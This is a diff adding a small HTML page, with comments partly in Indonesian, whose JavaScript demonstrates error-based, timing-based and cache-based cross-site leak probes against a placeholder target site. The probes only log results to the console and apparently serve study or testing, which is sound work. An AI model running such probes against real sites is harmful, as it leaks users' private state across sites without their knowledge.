@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Error-based XS-Leak
+function errorBasedLeak() {
+    const targetUrl = 'https://target-site.com/private-page';
+    
+    // Coba detect error messages
+    fetch(targetUrl)
+    .then(response => {
+        if (!response.ok) {
+            // Error status bisa leak information
+            console.log('Status:', response.status);
+        }
+    })
+    .catch(error => {
+        // Network errors bisa juga leak info
+        console.log('Error type:', error.name);
+    });
+}
+
+// Timing-based XS-Leak  
+function timingLeak() {
+    const start = performance.now();
+    
+    fetch('https://target-site.com/resource')
+    .then(() => {
+        const duration = performance.now() - start;
+        console.log('Load time:', duration);
+        // Timing differences bisa detect user state
+    });
+}
+
+// Cache-based XS-Leak
+function cacheLeak() {
+    const img = new Image();
+    const start = performance.now();
+    
+    img.src = 'https://target-site.com/cached-resource';
+    img.onload = () => {
+        const loadTime = performance.now() - start;
+        console.log('Cached load time:', loadTime);
+    };
+}
+</script>
+<button onclick="errorBasedLeak()">Test XS-Leak</button>
+</body>
+</html>
